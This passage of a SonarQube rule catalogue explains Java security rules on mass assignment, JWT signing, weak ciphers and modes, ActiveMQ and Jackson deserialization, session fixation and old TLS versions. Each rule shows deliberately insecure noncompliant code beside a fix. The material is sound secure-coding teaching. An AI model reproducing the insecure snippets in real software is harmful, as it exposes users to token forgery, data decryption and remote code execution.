        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4684">
              java:S4684
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>On one side, Spring MVC automatically bind request parameters to beans declared as arguments of methods annotated with
<code>&#64;RequestMapping</code>. Because of this automatic binding feature, it’s possible to feed some unexpected fields on the arguments of the
<code>&#64;RequestMapping</code> annotated methods.</p>
<p>On the other end, persistent objects (<code>&#64;Entity</code> or <code>&#64;Document</code>) are linked to the underlying database and updated
automatically by a persistence framework, such as Hibernate, JPA or Spring Data MongoDB.</p>
<p>These two facts combined together can lead to malicious attack: if a persistent object is used as an argument of a method annotated with
<code>&#64;RequestMapping</code>, it’s possible from a specially crafted user input, to change the content of unexpected fields into the database.</p>
<p>For this reason, using <code>&#64;Entity</code> or <code>&#64;Document</code> objects as arguments of methods annotated with <code>&#64;RequestMapping</code>
should be avoided.</p>
<p>In addition to <code>&#64;RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>&#64;GetMapping</code>,
<code>&#64;PostMapping</code>, <code>&#64;PutMapping</code>, <code>&#64;DeleteMapping</code>, <code>&#64;PatchMapping</code>.</p>
<h3>Noncompliant code example</h3>
<pre>
import javax.persistence.Entity;

&#64;Entity
public class Wish {
  Long productId;
  Long quantity;
  Client client;
}

&#64;Entity
public class Client {
  String clientId;
  String name;
  String password;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

&#64;Controller
public class WishListController {

  &#64;PostMapping(path &#61; &#34;/saveForLater&#34;)
  public String saveForLater(Wish wish) {
    session.save(wish);
  }

  &#64;RequestMapping(path &#61; &#34;/saveForLater&#34;, method &#61; RequestMethod.POST)
  public String saveForLater(Wish wish) {
    session.save(wish);
  }
}
</pre>
<h3>Compliant solution</h3>
<pre>
public class WishDTO {
  Long productId;
  Long quantity;
  Long clientId;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

&#64;Controller
public class PurchaseOrderController {

  &#64;PostMapping(path &#61; &#34;/saveForLater&#34;)
  public String saveForLater(WishDTO wish) {
    Wish persistentWish &#61; new Wish();
    // do the mapping between &#34;wish&#34; and &#34;persistentWish&#34;
    [...]
    session.save(persistentWish);
  }

  &#64;RequestMapping(path &#61; &#34;/saveForLater&#34;, method &#61; RequestMethod.POST)
  public String saveForLater(WishDTO wish) {
    Wish persistentWish &#61; new Wish();
    // do the mapping between &#34;wish&#34; and &#34;persistentWish&#34;
    [...]
    session.save(persistentWish);
  }
}
</pre>
<h3>Exceptions</h3>
<p>No issue is reported when the parameter is annotated with <code>&#64;PathVariable</code> from Spring Framework, since the lookup will be done via id,
the object cannot be forged on client side.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/915" rel="nofollow">MITRE, CWE-915</a> - Improperly Controlled Modification of Dynamically-Determined Object
  Attributes </li><li> <a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf" rel="nofollow">Two Security Vulnerabilities in the Spring
  Framework’s MVC by Ryan Berg and Dinis Cruz</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5659">
              java:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in Java JWT</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
import io.jsonwebtoken.Jwts;

public void encode() {
    Jwts.builder()
        .setSubject(USER_LOGIN)
        .compact(); // Noncompliant
}
</pre>
<pre data-diff-id="12" data-diff-type="noncompliant">
import io.jsonwebtoken.Jwts;

public void decode() {
    Jwts.parser()
        .setSigningKey(SECRET_KEY)
        .parse(token)
        .getBody(); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
import io.jsonwebtoken.Jwts;

public void encode() {
    Jwts.builder()
        .setSubject(USER_LOGIN)
        .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
        .compact();
}
</pre>
<p>When using <code>Jwts.parser()</code>, make sure to call <code>parseClaimsJws</code> instead of <code>parse</code> as it throws exceptions for
invalid or missing signatures.</p>
<pre data-diff-id="12" data-diff-type="compliant">
import io.jsonwebtoken.Jwts;

public void decode() {
    Jwts.parser()
        .setSigningKey(SECRET_KEY)
        .parseClaimsJws(token)
        .getBody();
}
</pre>
<h3>How does this work?</h3>
<h4>Always sign your tokens</h4>
<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can
tamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a
signing function, and using it is usually as simple as providing a secret key when the token is created.</p>
<h4>Choose a strong cipher algorithm</h4>
<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are
considered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),
which uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be
able to forge tokens.</p>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue follow these instructions:</p>
<ol><li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li><li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take on encountering an invalid token should be denying the request carrying it and logging the event for further
  investigation. </li><li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li></ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/347" rel="nofollow">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5547">
              java:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher des &#61; Cipher.getInstance(&#34;DES&#34;); // Noncompliant
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher aes &#61; Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;);
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5542">
              java:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance(&#34;AES/CBC/PKCS5Padding&#34;); // Noncompliant
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance(&#34;RSA/None/NoPadding&#34;); // Noncompliant
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;);
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance(&#34;RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING&#34;);
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5301">
              java:S5301
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>ActiveMQ can send/receive JMS Object messages (named ObjectMessage in ActiveMQ context) to comply with JMS specification. Internally, ActiveMQ
relies on Java serialization mechanism for marshaling/unmarshalling of the message payload. Deserialization based on data supplied by the user could
lead to remote code execution attacks, where the structure of the serialized data is changed to modify the behavior of the object being
unserialized.</p>
<p>To limit the risk to be victim of such attack, ActiveMQ 5.12.2&#43; enforces developers to explicitly whitelist packages that can be exchanged using
ObjectMessages.</p>
<h3>Noncompliant code example</h3>
<pre>
ActiveMQConnectionFactory factory &#61; new ActiveMQConnectionFactory(&#34;tcp://localhost:61616&#34;);
factory.setTrustAllPackages(true); // Noncompliant

ActiveMQConnectionFactory factory &#61; new ActiveMQConnectionFactory(&#34;tcp://localhost:61616&#34;);
// no call to factory.setTrustedPackages(...);
</pre>
<h3>Compliant solution</h3>
<pre>
ActiveMQConnectionFactory factory &#61; new ActiveMQConnectionFactory(&#34;tcp://localhost:61616&#34;);
factory.setTrustedPackages(Arrays.asList(&#34;org.mypackage1&#34;, &#34;org.mypackage2&#34;));
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li><li> <a href="https://activemq.apache.org/objectmessage.html" rel="nofollow">ActiveMQ ObjectMessage Security Advisory</a> </li><li> <a href="https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt" rel="nofollow">CVE-2015-5254</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5876">
              java:S5876
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session fixation attacks occur when an attacker can force a legitimate user to use a session ID that he knows. To avoid fixation attacks, it’s a
good practice to generate a new session each time a user authenticates and delete/invalidate the existing session (the one possibly known by the
attacker).</p>
<h3>Noncompliant code example</h3>
<p>In a Spring Security’s context, session fixation protection is enabled by default but can be disabled with <code>sessionFixation().none()</code>
method:</p>
<pre>
&#64;Override
protected void configure(HttpSecurity http) throws Exception {
   http.sessionManagement()
     .sessionFixation().none(); // Noncompliant: the existing session will continue
}
</pre>
<h3>Compliant solution</h3>
<p>In a Spring Security’s context, session fixation protection can be enabled as follows:</p>
<pre>
&#64;Override
protected void configure(HttpSecurity http) throws Exception {
  http.sessionManagement()
     .sessionFixation().newSession(); // Compliant: a new session is created without any of the attributes from the old session being copied over

  // or

  http.sessionManagement()
     .sessionFixation().migrateSession(); // Compliant: a new session is created, the old one is invalidated and the attributes from the old session are copied over.
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> -
  Broken Authentication </li><li> <a href="https://owasp.org/www-community/attacks/Session_fixation" rel="nofollow">OWASP Sesssion Fixation</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4423">
              java:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        SSLContext.getInstance(&#34;TLSv1.1&#34;); // Noncompliant
    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        SSLContext.getInstance(&#34;TLSv1.2&#34;);
    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4544">
              java:S4544
            </a>
          </td>
          <td>
            <details>
              <p>Using unsafe Jackson deserialization configuration is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-4995" rel="nofollow">CVE-2017-4995</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-19362" rel="nofollow">CVE-2018-19362</a> </li></ul>
<p>When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as Polymorphic Deserialization, &#34;deserialization gadgets&#34;
may allow an attacker to perform remote code execution.</p>
<p>This rule raises an issue when:</p>
<ul><li> <code>enableDefaultTyping()</code> is called on an instance of <code>com.fasterxml.jackson.databind.ObjectMapper</code> or
